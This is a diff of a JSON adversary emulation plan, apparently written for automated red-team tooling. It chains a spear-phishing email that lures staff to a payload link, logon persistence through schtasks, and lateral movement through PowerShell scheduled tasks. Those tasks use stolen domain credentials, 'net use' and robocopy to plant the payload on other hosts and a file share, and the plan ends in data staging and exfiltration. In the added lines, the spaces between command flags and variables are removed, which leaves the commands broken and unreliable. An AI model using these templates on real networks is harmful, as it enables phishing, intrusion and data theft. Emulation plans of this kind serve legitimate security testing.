@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,16 +49,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "SpearPhishingLink",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "SpearPhishingLink",
             "label": "spearPhishingLink",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -67,13 +67,13 @@
                 "driveby": "self.driveby",
                 "target": "self.target_1",
                 "tune": {
-                    "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${self.driveby_domain}/${self.payload_name} .\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
+                    "body": "Hi, \nThe 2019 Senior Staff Club House calendar gallery has been updated. To submit artwork for consideration, please fill in the form at http://${self.driveby_domain}/${self.payload_name}.\n The deadline for submission is May 17, 2019. \nThanks and look forward to seeing your beautiful projects! \nKelly"
                 }
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -84,8 +84,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -96,8 +96,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -111,8 +111,8 @@
             }
         },
         {
-            "tactic": "ValidAccounts_LocalAccounts",
-            "technique": "PrivilegeEscalation",
+            "tactic": "PrivilegeEscalation",
+            "technique": "ValidAccounts_LocalAccounts",
             "label": "validAccounts_LocalAccounts_t1",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -123,8 +123,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_2",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -134,8 +134,8 @@
             }
         },
         {
-            "tactic": "ScheduledTaskPersistence",
-            "technique": "Persistence",
+            "tactic": "Persistence",
+            "technique": "ScheduledTaskPersistence",
             "label": "scheduled_task_1",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -143,13 +143,13 @@
                 "tool": "self.tool",
                 "target": "self.target_1_elevated",
                 "tune": {
-                    "command": "schtasks /create /f /tn ${self.target_1_elevated_taskname} /tr ${self.target_1_elevated_payload_destination}\\${self.payload_name} /sc onlogon"
+                    "command": "schtasks /create /f /tn${self.target_1_elevated_taskname}/tr${self.target_1_elevated_payload_destination}\\${self.payload_name}/sc onlogon"
                 }
             }
         },
         {
-            "tactic": "RegistryRunKeysStartupFolder",
-            "technique": "Persistence",
+            "tactic": "Persistence",
+            "technique": "RegistryRunKeysStartupFolder",
             "label": "Startup_Folder_1",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -158,8 +158,8 @@
             }
         },
         {
-            "tactic": "SystemOwnerUserDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t1_elevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -171,8 +171,8 @@
             }
         },
         {
-            "tactic": "RemoteSystemDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_elevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -184,8 +184,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "domainAccount_t1_elevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -197,8 +197,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "domainGroups_t1_elevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -210,8 +210,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConnectionsDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t1_elevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -223,8 +223,8 @@
             }
         },
         {
-            "tactic": "ScheduledTask",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "ScheduledTask",
             "label": "scheduled_task_2",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -232,13 +232,13 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru ${self.target_1_elevated_username} /rp ${self.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${self.target_2_hostname} /user:${self.target_2_username}@${self.domain} ${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${self.target_2_hostname}\\c$\\users\\public ${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user ${self.target_1_elevated_username} -password ${self.target_1_elevated_password} }"
+                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /ST 23:58 /sc once /tr cmd.exe /ru${self.target_1_elevated_username}/rp${self.target_1_elevated_password}; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\${self.target_2_hostname}/user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"c:\\users\\public\\ \\\\${self.target_2_hostname}\\c$\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -once -at 23:59; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" -user${self.target_1_elevated_username}-password${self.target_1_elevated_password}}"
                 }
             }
         },
         {
-            "tactic": "ScheduledTaskExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution_1",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -247,13 +247,13 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "schtasks /run /tn ${self.target_2_taskname}"
+                    "command": "schtasks /run /tn${self.target_2_taskname}"
                 }
             }
         },
         {
-            "tactic": "ScheduledTask",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "ScheduledTask",
             "label": "scheduled_task_3",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -261,13 +261,13 @@
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.target_2_taskname} /TR c:\\users\\public\\${self.payload_name} /RL highest /u ${self.target_2_username}@${self.domain} /p ${self.target_2_password} /ru ${self.target_2_username}@${self.domain} /rp ${self.target_2_password} /s ${self.target_2_hostname}"
+                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_2_taskname}/TR c:\\users\\public\\${self.payload_name}/RL highest /u${self.target_2_username}@${self.domain}/p${self.target_2_password}/ru${self.target_2_username}@${self.domain}/rp${self.target_2_password}/s${self.target_2_hostname}"
                 }
             }
         },
         {
-            "tactic": "ScheduledTaskExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution_2",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -278,8 +278,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_3",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -289,8 +289,8 @@
             }
         },
         {
-            "tactic": "TaintSharedContent",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "TaintSharedContent",
             "label": "taintSharedContent_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -298,13 +298,13 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "robocopy c:\\users\\public\\ \\\\file\\share ${self.payload_name}"
+                    "command": "robocopy c:\\users\\public\\ \\\\file\\share${self.payload_name}"
                 }
             }
         },
         {
-            "tactic": "ScheduledTask",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "ScheduledTask",
             "label": "scheduled_task_4",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -312,13 +312,13 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain} ${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public ${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" }"
+                    "command": "powershell &{schtasks /create /f /tn \"${self.target_2_taskname}\" /sc onlogon /tr cmd.exe; $action1 = New-ScheduledTaskAction -Execute \"net\" -Argument \"use \\\\file\\share /user:${self.target_2_username}@${self.domain}${self.target_2_password}\"; $action2 = New-ScheduledTaskAction -Execute \"robocopy\" -Argument \"\\\\file\\share c:\\users\\public${self.payload_name}\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; Set-ScheduledTask -action $action1,$action2 -trigger $trigger -taskname \"${self.target_2_taskname}\" }"
                 }
             }
         },
         {
-            "tactic": "LocalDataStaging",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "LocalDataStaging",
             "label": "localDataStaging_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -330,8 +330,8 @@
             }
         },
         {
-            "tactic": "LocalDataStaging",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "LocalDataStaging",
             "label": "localDataStaging_t2_2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -343,8 +343,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -354,8 +354,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -365,8 +365,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1_elevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -376,8 +376,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1_1_elevated",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -387,8 +387,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -397,8 +397,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -407,8 +407,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
